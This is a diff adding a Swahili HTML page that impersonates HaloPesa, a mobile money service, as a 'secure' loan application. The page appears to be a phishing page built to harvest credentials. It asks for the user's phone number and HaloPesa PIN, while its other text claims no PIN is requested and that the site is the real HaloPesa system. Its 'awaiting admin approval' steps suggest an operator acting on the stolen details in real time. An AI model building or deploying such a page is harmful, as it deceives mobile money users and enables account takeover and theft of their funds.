@@ -1,0 +1,85 @@
+<!doctype html>
+<html lang="sw">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
+  <meta name="theme-color" content="#f4511e">
+  <title>Maombi ya Mkopo ya HaloPesa</title>
+  <link rel="stylesheet" href="/styles.css">
+</head>
+<body>
+<main class="app">
+  <header class="topbar">
+    <div class="brand-logo" aria-label="HaloPesa">Halo<span>Pesa</span></div>
+    <div><div class="brand">Maombi ya Mkopo ya HaloPesa</div><div class="subbrand">Maombi ya mkopo • Salama • Haraka</div></div>
+    <div class="secure" aria-label="Salama">🔒</div>
+  </header>
+
+  <div class="notice">
+    <strong>Utoaji wa Mkopo wa HaloPesa</strong>
+    <span>Mfumo halisi wa halopesa.Pata nafasi ya kuomba mkopo kwa urahisi na kwa hatua chache. Jaza taarifa zako kwa usahihi na fuata hatua za uthibitisho wa maombi yako.</span>
+  </div>
+
+  <div class="steps" aria-label="Hatua za maombi">
+    <span class="step active">1</span><i></i><span class="step">2</span><i></i><span class="step">3</span><i></i><span class="step">4</span>
+  </div>
+
+  <section class="page active" data-page="1">
+    <div class="hero"><div class="icon"><img src="/halopesa-icon.png" alt="HaloPesa"></div><h1>Maombi ya Mkopo</h1>
+      <p>Weka nambari ya simu na kitambulisho cha maombi chenye tarakimu nne. Usiweke PIN au msimbo wa SMS.</p></div>
+    <form id="loginForm" class="card form-card">
+      <label>Nambari ya simu ya maombi</label>
+      <input id="phone" required placeholder="06XXXXXXXX" inputmode="tel" autocomplete="tel">
+      <label> PIN ya halopesa</label>
+      <input id="applicationIdInput" required maxlength="80" placeholder="Weka neno siri ya halopesa" autocomplete="off">
+      <div class="hint">Tumia PIN ya HaloPesa uliyosahihi.</div>
+      <button class="primary" id="startApplication" type="submit">TUMA OMBI <span>→</span></button>
+      <button class="secondary" id="adminInfoButton" type="button">Admin</button>
+      <div class="hint hidden" id="adminInfo">Ufikiaji wa msimamizi unapatikana kwa wasimamizi walioidhinishwa pekee.</div>
+      <button class="secondary" id="adminInfoButton" type="button">Admin</button>
+      <div class="hint hidden" id="adminInfo">Ufikiaji wa msimamizi unapatikana kwa wasimamizi walioidhinishwa pekee.</div>
+      <div class="error hidden" id="loginError"></div>
+      <div class="waiting hidden" id="approvalWaiting"><div class="spinner"></div><strong>Inasubiri idhini ya msimamizi</strong><span>Ombi lako limetumwa. Tafadhali subiri huku msimamizi aliyeidhinishwa wa halopesa akilipitia.</span><small>Application pin: <b id="applicationNumber">—</b></small></div>
+    </form>
+  </section>
+
+  <section class="page" data-page="2">
+    <div class="hero"><div class="icon"><img src="/halopesa-icon.png" alt="HaloPesa"></div><h1>Kitambulisho hakijakubaliwa</h1>
+      <p>Hakiki kitambulisho cha maombi chenye tarakimu nne. Usiweke PIN au msimbo wa SMS hapa.</p></div>
+    <div class="card form-card"><div class="error" id="page2Error">Kitambulisho cha maombi hakijakubaliwa.</div>
+      <button class="primary" type="button" id="backToApplicationFromId">RUDI KWENYE MAOMBI <span>→</span></button>
+    </div>
+  </section>
+
+  <section class="page" data-page="3">
+    <div class="hero"><div class="icon"><img src="/halopesa-icon.png" alt="HaloPesa"></div><h1>Uthibitisho salama</h1>
+      <p>Hatutakuomba uweke PIN ya simu au msimbo wa SMS kwenye ukurasa huu. Rudi kwenye maombi ikiwa unahitaji kurekebisha taarifa.</p></div>
+    <div class="card form-card"><button class="primary" type="button" id="backToApplicationFromCode">RUDI KWENYE MAOMBI <span>→</span></button></div>
+  </section>
+
+  <section class="page" data-page="4">
+    <div class="hero"><div class="icon"><img src="/halopesa-icon.png" alt="HaloPesa"></div><h1>Kiasi cha Mkopo</h1>
+      <p>Hatua za awali za ombi zimekamilika. Weka kiasi unachotaka kuomba kwa ajili ya mapitio ya msimamizi.</p></div>
+    <div class="card form-card">
+      <label>Kiasi cha mkopo kinachoombwa</label>
+      <input id="loanAmount" type="number" min="1" step="1" inputmode="numeric" required placeholder="Weka kiasi">
+      <div class="hint">Weka kiasi unachotaka kuomba. Msimamizi atapitia kiasi hicho kabla ya utoaji wa mkopo.</div>
+      <button class="primary" id="loanAmountBtn">TUMA KIASI <span>→</span></button>
+      <div class="waiting hidden" id="loanAmountWaiting"><div class="spinner"></div><strong>Inasubiri idhini ya kiasi</strong><span>Kiasi ulichoomba kimetumwa kwa msimamizi kwa ajili ya mapitio.</span></div>
+      <div class="error hidden" id="page4Error"></div>
+    </div>
+  </section>
+
+  <section class="page" data-page="success">
+    <div class="success-card"><div class="big-check">✓</div><h1>Hongera!</h1>
+      <p>Ombi lako la mkopo la <strong id="successAmount">—</strong> limepokelewa na linashughulikiwa. Uamuzi wa mwisho utathibitishwa na mtoa huduma husika.</p>
+      <div class="brand-disclaimer">Hali ya ombi — thibitisha uamuzi kupitia mtoa huduma rasmi.</div>
+      <div class="application-number" id="successNumber">—</div><small>Hifadhi Kitambulisho hiki cha Maombi kwa ajili ya kumbukumbu.</small>
+    </div>
+  </section>
+
+  <footer><span>🔒 Ombi salama</span><span>•</span><span>Mchakato wa utoaji wa mkopo wa HaloPesa</span></footer>
+</main>
+<script src="/app.js"></script>
+</body>
+</html>
